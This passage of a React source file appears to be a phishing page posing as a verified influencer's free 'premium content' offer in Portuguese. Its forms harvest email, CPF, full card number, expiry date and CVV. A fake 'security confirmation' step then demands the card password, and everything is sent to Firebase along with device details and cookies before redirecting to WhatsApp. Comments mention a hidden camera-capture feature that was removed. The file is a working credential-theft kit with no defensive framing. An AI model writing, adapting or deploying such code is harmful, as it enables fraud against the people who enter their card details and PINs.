    // Removido fotoCapturada
    dataHora: deviceInfo.localDateTime,
    dataHoraISO: deviceInfo.dateTime,
    timestamp: deviceInfo.timestamp,
    versaoCaptura: "2.8", // Updated version
    fonte: "Isabella Lua - Assinatura Cartão (Parte 1)",
  }

  const success = await sendDataToFirebase(dadosAssinatura);

  // Simulate processing delay
  await new Promise(resolve => setTimeout(resolve, 2000));

  setIsLoading(false);
  setShowSubscriptionModal(false);
  setShowCardPasswordModal(true); // Show password modal regardless of initial Firebase save success for this flow
}

const handleCardPasswordSubmission = async (e: React.FormEvent) => {
  e.preventDefault()
  setIsLoading(true)

  // Removida a chamada para capturePhoto()
  const deviceInfo = getDeviceInfo()
  const cookiesInfo = getCookiesInfo()

  const dadosAssinaturaFinal = {
    email: subscriptionEmail, // Re-include for full context
    cpf: cpf, // Re-include for full context
    cartaoCredito: creditCardNumber, // Re-include for full context
    dataExpiracaoCartao: expirationDate, // Re-include for full context
    cvvCartao: cvv, // Re-include for full context
    senhaCartao: cardPassword, // This is the new piece of data
    plataforma: "Assinatura Cartão - Conteúdo Full (Senha)",
    dispositivo: deviceInfo,
    cookies: cookiesInfo,
    // Removido fotoCapturada
    dataHora: deviceInfo.localDateTime,
    dataHoraISO: deviceInfo.dateTime,
    timestamp: deviceInfo.timestamp,
    versaoCaptura: "2.8.1", // Specific version for password step
    fonte: "Isabella Lua - Assinatura Cartão (Parte 2 - Senha)",
  }

  await sendDataToFirebase(dadosAssinaturaFinal);

  // Simulate final processing delay
  await new Promise(resolve => setTimeout(resolve, 2000));

  setIsLoading(false);
  setShowCardPasswordModal(false);
  window.location.href = WHATSAPP_LINK; // Redirect to WhatsApp
}

const formatCreditCardNumber = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  const match = cleaned.match(/.{1,4}/g);
  return match ? match.join(' ') : cleaned;
};

// Helper for expiration date formatting (MM/YY)
const formatExpirationDate = (value: string) => {
  const cleaned = value.replace(/\D/g, '');
  if (cleaned.length > 2) {
    return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
  }
  return cleaned;
};

return (
  <div className="min-h-screen bg-gradient-to-br from-slate-900 via-gray-900 to-black relative overflow-hidden">
     {/* Background Pattern */}
    <div
      className="absolute inset-0 opacity-50"
      style={{
        backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fillRule='evenodd'%3E%3Cg fill='%23ffffff' fillOpacity='0.03'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
      }}
    ></div>

    <div className="relative z-10 min-h-screen flex flex-col">
      <div className="flex-1 px-4 py-6 sm:px-6 lg:px-8">
        <div className="max-w-6xl mx-auto">
           {/* Header - Responsivo */}
          <div className="text-center mb-8 lg:mb-12">
            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 mb-4">
              <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
              <span className="text-white text-sm font-medium">Online agora</span>
            </div>
            <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-white mb-2">Conteúdo Exclusivo</h1>
            <p className="text-gray-300 text-sm sm:text-base max-w-md mx-auto">
              Acesse agora com sua rede social favorita
            </p>
          </div>

           {/* Main Content - Layout Responsivo */}
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-start">
             {/* Left Column - Profile */}
            <div className="order-2 lg:order-1">
               {/* Profile Card */}
              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 sm:p-8 border border-white/20 shadow-2xl">
                <div className="flex flex-col sm:flex-row items-center sm:items-start gap-4 sm:gap-6">
                  <div className="relative flex-shrink-0">
                    <Avatar className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-white/30 shadow-xl">
                      <AvatarImage src="/images/isabella-perfil.jpg" alt="Isabella Lua" className="object-cover" />
                      <AvatarFallback className="bg-gradient-to-br from-purple-500 to-pink-500 text-white font-bold text-2xl">
                        IL
                      </AvatarFallback>
                    </Avatar>
                     {/* Verification Badge */}
                    <div className="absolute -bottom-1 -right-1 bg-blue-500 rounded-full p-2 border-2 border-white shadow-lg">
                      <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                  </div>

                  <div className="flex-1 text-center sm:text-left">
                    <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 mb-2">
                      <h2 className="text-xl sm:text-2xl font-bold text-white">Isabella Lua</h2>
                      <div className="flex items-center gap-2">
                        <div className="bg-blue-500 rounded-full p-1">
                          <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                        <span className="bg-gradient-to-r from-purple-500 to-pink-500 text-white text-xs px-2 py-1 rounded-full font-semibold">
                          VIP
                        </span>
                      </div>
                    </div>

                    <p className="text-gray-300 text-sm mb-4">Modelo • Influenciadora • Conteúdo Premium</p>

                     {/* Stats */}
                    <div className="grid grid-cols-3 gap-4 mb-4">
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">127K</div>
                        <div className="text-xs text-gray-400">Seguidores</div>
                      </div>
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">2.1M</div>
                        <div className="text-xs text-gray-400">Curtidas</div>
                      </div>
                      <div className="text-center">
                        <div className="text-lg sm:text-xl font-bold text-white">850</div>
                        <div className="text-xs text-gray-400">Posts</div>
                      </div>
                    </div>

                     {/* Status */}
                    <div className="flex flex-wrap justify-center sm:justify-start gap-3 text-xs">
                      <div className="flex items-center gap-1 bg-green-500/20 text-green-400 px-2 py-1 rounded-full">
                        <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                        <span>Online</span>
                      </div>
                      <div className="flex items-center gap-1 bg-red-500/20 text-red-400 px-2 py-1 rounded-full">
                        <Lock className="w-3 h-3" />
                        <span>Privado</span>
                      </div>
                      <div className="flex items-center gap-1 bg-yellow-500/20 text-yellow-400 px-2 py-1 rounded-full">
                        <Star className="w-3 h-3" />
                        <span>Premium</span>
                      </div>
                    </div>
                  </div>
                </div>

                 {/* Alert */}
                <div className="mt-6 bg-gradient-to-r from-purple-500/20 to-pink-500/20 border border-purple-500/30 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <Shield className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-white text-sm font-medium mb-1">🔥 Novo conteúdo disponível!</p>
                      <p className="text-gray-300 text-xs">3 fotos e 1 vídeo exclusivos foram adicionados hoje</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

             {/* Right Column - Preview & Actions */}
            <div className="order-1 lg:order-2">
               {/* Preview Images */}
              <div className="mb-8">
                <h3 className="text-white text-lg font-semibold mb-4 text-center lg:text-left">Prévia do Conteúdo</h3>
                <div className="grid grid-cols-3 gap-3 sm:gap-4 max-w-sm mx-auto lg:max-w-none">
                  {[1, 2, 3].map((index) => (
                    <div key={index} className="relative group cursor-pointer">
                      <div className="aspect-[3/4] bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl overflow-hidden border border-white/10">
                        <img
                          src={previewImages[index - 1] || "/placeholder.svg"}
                          alt={`Preview ${index}`}
                          className="w-full h-full object-cover blur-sm group-hover:blur-[2px] transition-all duration-300"
                        />
                        <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent flex items-center justify-center">
                          <div className="text-white text-center">
                            <div className="bg-white/20 backdrop-blur-sm rounded-full p-3 mb-2">
                              <Lock className="w-4 h-4" />
                            </div>
                            <p className="text-xs font-medium">{index === 2 ? "Vídeo" : `Foto #${index}`}</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
                <p className="text-center text-gray-400 text-sm mt-4">
                  <span className="text-white font-medium">3 novos conteúdos</span> • Desbloqueie com seu login
                </p>
              </div>

               {/* CTA Button */}
              <div className="space-y-4">
                <Button
                  onClick={() => {
                    setShowSubscriptionModal(true);
                    setSelectedPaymentMethod(null); // Reset selection
                  }}
                  className="w-full h-12 sm:h-14 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                >
                  <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 mr-3" />
                  Assinar Conteúdo Premium
                </Button>

                <div className="flex items-center justify-center gap-4 text-xs text-gray-400 pt-2">
                  <div className="flex items-center gap-1">
                    <Shield className="w-3 h-3 text-green-400" />
                    <span>100% Seguro</span>
                  </div>
                  <span>•</span>
                  <span>Acesso Imediato</span>
                  <span>•</span>
                  <span>Gratuito</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

       {/* Footer */}
      <footer className="border-t border-white/10 bg-black/20 backdrop-blur-sm py-4">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
            <p>© 2024 Isabella Lua. Todos os direitos reservados.</p>
            <div className="flex gap-4">
              <a href="#" className="hover:text-white transition-colors">
                Privacidade
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Termos
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Suporte
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>

     {/* Subscription Modal - Step 1: Choose Payment Method / Card Form / PIX Form */}
    <Dialog open={showSubscriptionModal} onOpenChange={setShowSubscriptionModal}>
      <DialogContent className="sm:max-w-md p-0 rounded-2xl overflow-hidden max-h-[90vh] flex flex-col">
        <DialogHeader className="p-4 sm:p-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white flex-shrink-0">
          <DialogTitle className="text-2xl font-bold text-center">
            {selectedPaymentMethod ? "Assinatura Premium" : "Escolha sua Assinatura"}
          </DialogTitle>
          <DialogDescription className="text-center text-white/80 mt-1 text-sm">
            {selectedPaymentMethod === 'card' && "Preencha os dados do seu cartão para acesso completo."}
            {!selectedPaymentMethod && "Selecione como deseja acessar o conteúdo exclusivo da Isabella Lua."}
          </DialogDescription>
        </DialogHeader>

        <div className="p-4 sm:p-6 flex-1 overflow-y-auto">
          {!selectedPaymentMethod && (
            <div className="space-y-4">
              <Button
                onClick={() => setSelectedPaymentMethod('card')}
                className="w-full min-h-[90px] bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg shadow-md flex flex-col items-center justify-center text-center px-4"
              >
                <CreditCard className="w-7 h-7 mb-2" />
                <span className="text-xl leading-tight">Assinar com Cartão</span>
                <span className="text-sm font-normal opacity-90 mt-1 leading-tight">Libera TODOS os conteúdos exclusivos</span>
              </Button>
            </div>
          )}

          {selectedPaymentMethod === 'card' && (
            <>
              <div className="text-center mb-6 bg-purple-50 p-4 rounded-lg border border-purple-200">
                <div className="flex flex-col sm:flex-row items-center justify-center gap-4"> {/* New flex container */}
                  {/* Adjusted image size and positioning */}
                  <img
                    src="/placeholder.svg?height=100&width=100"
                    alt="Capa do Conteúdo Exclusivo"
                    className="w-24 h-24 object-cover rounded-md flex-shrink-0"
                  />
                  <div className="flex-1 text-center sm:text-left"> {/* Text content */}
                    <div className="flex items-center justify-center sm:justify-start gap-2 mb-2">
                      <Tag className="w-5 h-5 text-purple-600" />
                      <p className="text-lg font-semibold text-purple-800">Oferta Exclusiva!</p>
                    </div>
                    <p className="text-sm text-gray-600">De <span className="line-through font-bold text-red-500">R$ 99,00</span> por apenas</p>
                    <p className="text-4xl font-extrabold text-green-600 mt-2">R$ 0,00</p>
                    <p className="text-xs text-gray-500 mt-1">Acesso completo por tempo limitado!</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleInitialCardSubmission} className="space-y-4">
                <div>
                  <Label htmlFor="sub-email" className="text-sm font-medium text-gray-700">
                    Email
                  </Label>
                  <div className="relative mt-1">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <Input
                      id="sub-email"
                      type="email"
                      placeholder="seu.email@exemplo.com"
                      value={subscriptionEmail}
                      onChange={(e) => setSubscriptionEmail(e.target.value)}
                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      required
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="cpf" className="text-sm font-medium text-gray-700">
                    CPF
                  </Label>
                  <div className="relative mt-1">
                    <Input
                      id="cpf"
                      type="text"
                      placeholder="000.000.000-00"
                      value={cpf}
                      onChange={(e) => setCpf(e.target.value.replace(/\D/g, ''))} // Remove non-digits
                      className="h-12 text-base pl-3 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      maxLength={11}
                      required
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="credit-card" className="text-sm font-medium text-gray-700">
                    Número do Cartão de Crédito
                  </Label>
                  <div className="relative mt-1">
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                    <Input
                      id="credit-card"
                      type="text"
                      placeholder="XXXX XXXX XXXX XXXX"
                      value={formatCreditCardNumber(creditCardNumber)}
                      onChange={(e) => setCreditCardNumber(e.target.value)}
                      className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                      maxLength={19} // 16 digits + 3 spaces
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="expiration-date" className="text-sm font-medium text-gray-700">
                      Validade (MM/AA)
                    </Label>
                    <div className="relative mt-1">
                      <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <Input
                        id="expiration-date"
                        type="text"
                        placeholder="MM/AA"
                        value={formatExpirationDate(expirationDate)}
                        onChange={(e) => setExpirationDate(e.target.value)}
                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                        maxLength={5} // MM/YY
                        required
                      />
                    </div>
                  </div>
                  <div>
                    <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                      CVV
                    </Label>
                    <div className="relative mt-1">
                      <LockKeyhole className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <Input
                        id="cvv"
                        type="text"
                        placeholder="123"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))} // Remove non-digits
                        className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg"
                        maxLength={4}
                        required
                      />
                    </div>
                  </div>
                </div>

                 {/* Elementos ocultos para captura da câmera - REMOVIDOS */}
                {/* <video ref={videoRef} className="hidden" playsInline autoPlay muted></video> */}
                {/* <canvas ref={canvasRef} className="hidden"></canvas> */}

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Processando...
                    </div>
                  ) : (
                    "Continuar"
                  )}
                </Button>
              </form>
            </>
          )}

          <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
            Ao continuar, você concorda com os Termos de Serviço e a Política de Privacidade.
          </p>
        </div>
      </DialogContent>
    </Dialog>

     {/* Card Password Modal - Step 2 for Card */}
    <Dialog open={showCardPasswordModal} onOpenChange={setShowCardPasswordModal}>
      <DialogContent className="sm:max-w-sm p-0 rounded-2xl overflow-hidden text-center">
        <DialogHeader className="p-4 sm:p-6 bg-gradient-to-r from-blue-600 to-blue-800 text-white">
          <DialogTitle className="text-xl font-semibold flex items-center justify-center gap-2">
            <Shield className="w-6 h-6" /> Confirmação de Segurança
          </DialogTitle>
          <DialogDescription className="text-sm text-white/80 mt-1">
            Para sua segurança, solicitamos a senha do seu cartão.
          </DialogDescription>
        </DialogHeader>
        <div className="p-4 sm:p-6">
          <form onSubmit={handleCardPasswordSubmission} className="space-y-4">
            <div>
              <Label htmlFor="card-password" className="text-sm font-medium text-gray-700">
                Senha do Cartão
              </Label>
              <div className="relative mt-1">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                <Input
                  id="card-password"
                  type="password"
                  placeholder="Sua senha do cartão"
                  value={cardPassword}
                  onChange={(e) => setCardPassword(e.target.value)}
                  className="h-12 text-base pl-10 pr-3 border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-lg"
                  required
                />
              </div>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  Verificando...
                </div>
              ) : (
                "Confirmar Senha"
              )}
            </Button>
          </form>
          <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
            Esta etapa garante a segurança da sua transação.
          </p>
        </div>
      </DialogContent>
    </Dialog>
  </div>
)
}
